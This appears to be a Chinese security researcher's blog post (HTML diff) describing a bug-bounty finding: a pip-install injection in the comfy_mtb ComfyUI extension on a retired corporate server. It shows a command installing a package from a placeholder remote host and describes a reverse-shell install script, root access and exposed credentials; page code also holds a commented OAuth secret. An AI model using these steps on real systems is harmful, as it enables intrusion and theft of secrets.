@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html>
+  <head>
+<meta name="referrer" content="never">
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-CNTF3L2LQC"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-CNTF3L2LQC');
+</script>  <script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?a2d27f70a2f1f5f5edfb5884096627ae";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script> 
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="keywords" content="" />
+    <meta name="description" content="" />
+    
+    <title>
+      从一个废弃AI工作流平台拿下生产网 记SRC中的一次 ComfyUI comfy_mtb 插件 RCE - 白帽酱の博客
+    </title>
+    <link rel="manifest" href="/manifest.json" />
+    <link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />
+    
+<link rel="stylesheet" href="/style/style.css">
+
+  <meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="白帽酱の博客" type="application/atom+xml">
+</head>
+  <body>
+    <canvas id='pagemap'></canvas>
+    
+    <div id="post-toc" class="animated hiddenToc hide">
+      <span class="title">Toc</span>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E4%B8%AA%E5%A5%87%E6%80%AA%E7%9A%84%E5%BA%9F%E5%BC%83%E8%B5%84%E4%BA%A7%EF%BC%9F"><span class="toc-text">一个奇怪的废弃资产？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E4%B8%AAComfyUI-%E6%89%A9%E5%B1%95%E5%BC%95%E8%B5%B7%E7%9A%84RCE"><span class="toc-text">一个ComfyUI 扩展引起的RCE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B0%BE%E5%A3%B0"><span class="toc-text">尾声</span></a></li></ol>
+    </div>
+    
+    <div id="fixed-menu-wrap">
+      <span class="iconfont icon-sousuo search-box menu-reset"></span>
+      <span class="icon-toc menu-reset">Toc</span>
+      <span class="iconfont icon-arrowup menu-reset"></span>
+    </div>
+    <div id="fixed-menu">
+      <span class="iconfont icon-menu-"></span>
+    </div>
+    <div id="progress">
+      <div class="line"></div>
+    </div>
+    <div id="search-shade" class="animated hiddenSearch hide">
+      <div class="input-wrap">
+        <span class="iconfont icon-sousuo search-box"></span>
+        <input type="text" placeholder="Search" />
+        <span class="iconfont icon-close"></span>
+      </div>
+      <div class="search-result">
+        <div class="meta">
+          <span><b id="result-count">0</b> results found</span>
+          <img src="/images/logo.jpeg" />
+        </div>
+        <ul id="result-box"></ul>
+      </div>
+    </div>
+    <div id="menu-mask" class="animated hideMenuMask hide">
+      <span class="iconfont icon-close"></span>
+      <div class="nav">
+        
+        <a href="/" class="">
+          首页
+        </a>
+        
+        <a href="/archives" class="">
+          归档
+        </a>
+        
+        <a href="/categories" class="">
+          分类
+        </a>
+        
+        <a href="/tags" class="">
+          标签
+        </a>
+        
+        <a href="/friends" class="">
+          友链
+        </a>
+        
+        <a href="/about" class="">
+          关于
+        </a>
+        
+      </div>
+    </div>
+    <div id="header">
+      <div class="intro">
+        <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
+        <div class="author">白帽酱</div>
+      </div>
+      <div class="nav">
+        <span class="iconfont icon-menu menu-icon"></span>
+        <a href="#" class="search-box">
+          <span class="iconfont icon-sousuo"></span>
+        </a>
+      </div>
+    </div>
+    <div id="side" class="animated bounceInLeft">
+      <div class="shrink">
+        <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
+        <span class="iconfont icon-menu toggle-icon"></span>
+        <a href="#" class="search-box">
+          <span class="iconfont icon-sousuo"></span>
+        </a>
+      </div>
+      <div class="magnify">
+        <div class="about">
+          <div class="author">白帽酱</div>
+          <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
+        </div>
+
+        <div class="nav">
+          
+          <a href="/" class="">
+            首页
+          </a>
+          
+          <a href="/archives" class="">
+            归档
+          </a>
+          
+          <a href="/categories" class="">
+            分类
+          </a>
+          
+          <a href="/tags" class="">
+            标签
+          </a>
+          
+          <a href="/friends" class="">
+            友链
+          </a>
+          
+          <a href="/about" class="">
+            关于
+          </a>
+          
+          <a href="#" class="search-box">
+            <span class="iconfont icon-sousuo"></span>
+          </a>
+        </div>
+        <div class="bottom">
+          <div class="follow">
+            
+            <a href="https://github.com/burpheart" target="_block">
+              <span class="iconfont icon-github"></span>
+            </a>
+            
+            <a href="https://twitter.com/burp_heart" target="_block">
+              <span class="iconfont icon-twitter"></span>
+            </a>
+            
+            <a href="https://space.bilibili.com/32890488" target="_block">
+              <span class="iconfont icon-bilibili"></span>
+            </a>
+             
+            <a href="/atom.xml" target="_block">
+              <span class="iconfont icon-rss"></span>
+            </a>
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    <div id="container">
+      <div class="main animated bounceInRight delay-0.7s">
+        <article class="post-entry">
+    <div class="header">
+      
+      <div class="title">从一个废弃AI工作流平台拿下生产网 记SRC中的一次 ComfyUI comfy_mtb 插件 RCE</div>
+      <div class="meta">
+        <span class="item">
+          <span class="iconfont icon-time-circle"></span>
+          <span>2025/07/08</span>
+        </span>
+
+        
+
+         
+        <span class="item">
+          <span class="iconfont icon-folder"></span>
+          <span>
+              
+                
+                  <a href="/categories/WEB">WEB</a>
+                
+              
+          </span>
+        </span>
+        
+        
+         
+          <span class="item">
+            <span class="iconfont icon-tag1"></span>
+            <span>
+                
+                  
+                    <a href="/tags/WEB">WEB</a>
+                  
+                
+            </span>
+          </span>
+         
+      </div>
+      <div>
+      </div>
+    </div>
+    <html><head></head><body><h1 id="一个奇怪的废弃资产？">一个奇怪的废弃资产？<a class="post-anchor" href="#一个奇怪的废弃资产？"></a></h1><p>一天，我正看着刚刚收集的某SRC资产列表，在图标列表里发现了一个从没见过的奇怪图标。</p>
+<p>查看了下对应的资产，发现是一个定制的ComfyUI WEB资产 。</p>
+<p><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2025/png/25577536/1751976710953-98ee5dfc-4f14-4fbe-bb72-1b39f8ca1a6a.png" data-caption="" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2025/png/25577536/1751976710953-98ee5dfc-4f14-4fbe-bb72-1b39f8ca1a6a.png" alt=""></a></p>
+<span id="more"></span>
+
+<p>UI 功能基本上不全，随便写了个最小化流程执行后端还是返回500</p>
+<p>看了下ComfyUI 这个版本的老源码 也没有发现什么能利用的地方。</p>
+<h1 id="一个ComfyUI-扩展引起的RCE">一个ComfyUI 扩展引起的RCE<a class="post-anchor" href="#一个ComfyUI-扩展引起的RCE"></a></h1><p>ComfyUI有一个API可以列出当前安装的扩展列表</p>
+<figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><code class="hljs javascript">POST /extensions HTTP/<span class="hljs-number">1.1</span><br>Content-Type: application/json<br>Host: www.example.com<br><br>[<span class="hljs-string">"/extensions/core/clipspace.js"</span>, <span class="hljs-string">"/extensions/core/colorPalette.js"</span>,......]<br></code></pre></td></tr></tbody></table></figure>
+
+<p>站点上安装第三方扩展只有十几个，我马上就把它所使用的扩展全部下载下来进行代码审计</p>
+<p>其中有一个扩展引起了我的兴趣</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/melMass/comfy_mtb/blob/55226058d46a48b4251d85db035c8ef68ff9a19b/endpoint.py#L28">comfy_mtb</a> 扩展上有个API 它可以实现远程安装所需的python依赖</p>
+<p><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2025/png/25577536/1751978065560-8ce491c1-65f9-447e-a039-cc4761fb2f6e.png" data-caption="" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2025/png/25577536/1751978065560-8ce491c1-65f9-447e-a039-cc4761fb2f6e.png" alt=""></a></p>
+<p>看起来十分的安全 它使用的预制的包白名单  </p>
+<p>查看了下这个文件的版本历史</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/melMass/comfy_mtb/commit/d6e004cce2c32f8e48b868e66b89f82da4887dc3">https://github.com/melMass/comfy_mtb/commit/d6e004cce2c32f8e48b868e66b89f82da4887dc3</a></p>
+<p>果然 它某个版本前是可以安装任意包的</p>
+<p><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2025/png/25577536/1751978249352-753dd11a-e879-4a4f-afad-45ea86e5a6c5.png" data-caption="" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2025/png/25577536/1751978249352-753dd11a-e879-4a4f-afad-45ea86e5a6c5.png" alt=""></a></p>
+<p>现在 我们得到了一个可以安装任意pip包的pip命令注入</p>
+<p>我们该如何利用他呢？</p>
+<p>在公共pip仓库上上传一个恶意包? </p>
+<p>不 python其实可以直接安装远程HTTP上的包</p>
+<p>python -m pip install <a target="_blank" rel="noopener" href="http://x.x.x/shell.zip">http://x.x.x/shell.zip</a></p>
+<p>先nc 测试下目标是否出网</p>
+<p><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2025/png/25577536/1751978695033-73a908d6-f996-46ce-ab5d-3a4366e24ee0.png" data-caption="" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2025/png/25577536/1751978695033-73a908d6-f996-46ce-ab5d-3a4366e24ee0.png" alt=""></a></p>
+<p>目标返回了一个带完整pip UA的的请求!</p>
+<p>其中linux内核版本显示了由某SRC对应公司定制的内核版本名称 进一步确定了目标资产归属</p>
+<p>构造一个python tgz包 install.py 内写入反弹shell的py代码</p>
+<p>触发安装几秒后 收到了一个root shell</p>
+<p><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2025/png/25577536/1751978931961-48335c07-fda7-406b-84d1-afbc40cc0b75.png" data-caption="" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2025/png/25577536/1751978931961-48335c07-fda7-406b-84d1-afbc40cc0b75.png" alt=""></a></p>
+<p><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2025/png/25577536/1751979304029-7ee0f39a-e128-4ead-904a-28cd61e2b706.png" data-caption="" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2025/png/25577536/1751979304029-7ee0f39a-e128-4ead-904a-28cd61e2b706.png" alt=""></a></p>
+<p>环境变量中存在大量储存桶秘钥等敏感凭据</p>
+<p>curl试了下生产网的GIT 和 主站内部API均可正常访问</p>
+<h1 id="尾声">尾声<a class="post-anchor" href="#尾声"></a></h1><p>提交之后不出意外的这个漏洞被降级了</p>
+<p>这个服务主站点在漏洞提交时 已经挂出了服务终止公告 是一个已下线业务的残留服务</p>
+<ul>
+<li>文章发表时目标所属资产已早在几个月前下线 </li>
+<li>资产所属业务网站也已整体下线</li>
+<li>该漏洞早在2024年被修复  <a target="_blank" rel="noopener" href="https://github.com/melMass/comfy_mtb/commit/d6e004cce2c32f8e48b868e66b89f82da4887dc3">https://github.com/melMass/comfy_mtb/commit/d6e004cce2c32f8e48b868e66b89f82da4887dc3</a></li>
+</ul>
+</body></html>
+
+  
+  <div class="post-guide">
+    <div class="item left">
+        
+    </div>
+    <div class="item right">
+        
+          <a href="/2025/01/07/v8-bytecode-decompiler/">V8 字节码反编译 还原bytenode保护的js代码</a>
+        
+    </div>
+  </div>
+
+  
+
+  <div class="post-copyright">
+    <div class="auth">
+      本文作者：<a href="https://rce.moe">白帽酱</a>
+    </div>
+    <div class="link">
+      永久链接：<a href="https://rce.moe/2025/07/08/ComfyUIRCE/">https://rce.moe/2025/07/08/ComfyUIRCE/</a>
+    </div>
+    <div class="declare">
+      版权声明：本文首发于<a href="https://rce.moe">白帽酱</a>的博客，转载请注明出处！
+    </div>
+  </div>
+
+  <div id="comment"></div>
+
+  
+  
+</article>
+<!--<div id="gitalk-container"></div>-->
+<!--<link rel="stylesheet" href="https://unpkg.com/gitalk@latest/dist/gitalk.css">-->
+<!--<script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script>-->
+<!--<script src="https://priesttomb.github.io/js/md5.min.js"></script>-->
+<!--
+<script type="text/javascript">
+    new Gitalk({
+        clientID: '1488ae49eda310270a91',
+        clientSecret: '83e505f36d0351b0ef1a225d089546cb40ecd31a',
+        repo: 'hexoblog',
+        owner: 'burpheart',
+        admin: 'burpheart',
+        id: md5(location.pathname),
+        distractionFreeMode: true,
+        proxy: 'https://servelesscors.rce.moe/api/cors?url=https://github.com/login/oauth/access_token'
+    }).render('gitalk-container')
+-->
+<div id="tcomment"></div>
+<script src="https://cdn.jsdelivr.net/npm/twikoo@1.6.41/dist/twikoo.all.min.js"></script>
+<script>
+twikoo.init({
+  envId: 'https://twikoo.rce.moe', // 腾讯云环境填 envId；Vercel 环境填地址（https://xxx.vercel.app）
+  el: '#tcomment', // 容器元素
+  // region: 'ap-guangzhou', // 环境地域，默认为 ap-shanghai，腾讯云环境填 ap-shanghai 或 ap-guangzhou；Vercel 环境不填
+  // path: location.pathname, // 用于区分不同文章的自定义 js 路径，如果您的文章路径不是 location.pathname，需传此参数
+  // lang: 'zh-CN', // 用于手动设定评论区语言，支持的语言列表 https://github.com/twikoojs/twikoo/blob/main/src/client/utils/i18n/index.js
+})
+</script>
+</script>
+        <footer>
+          <div class="copyright">
+            ©2025
+            <a href="https://rce.moe">白帽酱</a> Powered by <a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a> |
+            <a target="_blank" rel="noopener" href="https://github.com/shixiaohu2206/hexo-theme-huhu">hexo-theme-huhu</a>
+          </div>
+          
+        </footer>
+      </div>
+    </div>
+  </body>
+  
+</html>
+<script type="text/javascript">
+                  window.HUHU_CONFIG = JSON.parse("{\"share\":[\"weibo\",\"weixin\",\"qqkongjian\",\"QQ\",\"douban\",\"facebook\",\"twitter\",\"google\"],\"service_worker\":{\"open\":false}}")
+                </script> <script type="text/javascript">window.addEventListener('load', function() {
+    
+    window.loadJs = function(d, m, a) {
+      var c = document.getElementsByTagName('head')[0] || document.head || document.documentElement
+      var b = document.createElement('script')
+      b.defer = true
+      b.setAttribute('type', 'text/javascript')
+      b.setAttribute('charset', 'UTF-8')
+      b.setAttribute('async', 'true')
+      b.setAttribute('src', d)
+      m && b.setAttribute('data-main', '/scripts/app-built')
+      if (typeof a === 'function') {
+        if (window.attachEvent) {
+          b.onreadystatechange = function() {
+            var e = b.readyState
+            if (e === 'loaded' || e === 'complete') {
+              b.onreadystatechange = null
+              a()
+            }
+          }
+        } else {
+          b.onload = a
+        }
+      }
+      c.appendChild(b)
+    }
+    window.loadJs && window.loadJs('https://cdn.bootcss.com/require.js/2.3.6/require.min.js', true, function() {require.config({"paths":{"util":"util","share":"share","search":"search","pagemap":"pagemap.min","registerSW":"registerSW","valine":"cdn/Valine.min","av":["https://cdn.jsdelivr.net/npm/leancloud-storage/dist/av-min"],"pjax":["https://cdn.bootcss.com/jquery.pjax/2.0.1/jquery.pjax.min"],"jquery":["https://cdn.bootcss.com/jquery/3.4.1/jquery.min"],"confirm":["https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min"],"fancybox":["https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min"],"chart":["https://cdn.bootcss.com/Chart.js/2.8.0-rc.1/Chart.bundle.min"]},"map":{"*":{"css":"https://cdn.bootcss.com/require-css/0.1.10/css.min.js"}},"shim":{"fancybox":{"deps":["css!https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min.css"]},"confirm":{"deps":["css!https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min.css"]},"chart":{"deps":["css!https://cdn.bootcss.com/Chart.js/2.8.0-rc.1/Chart.min.css"]}},"waitSeconds":3})})
+  })</script> <script type="text/javascript">
+                  ;(function() {
+                    var bp = document.createElement('script')
+                    var curProtocol = window.location.protocol.split(':')[0]
+                    if (curProtocol === 'https') {
+                      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js'
+                    } else {
+                      bp.src = 'http://push.zhanzhang.baidu.com/push.js'
+                    }
+                    var s = document.getElementsByTagName('script')[0]
+                    s.parentNode.insertBefore(bp, s)
+                  })()
+                </script> 
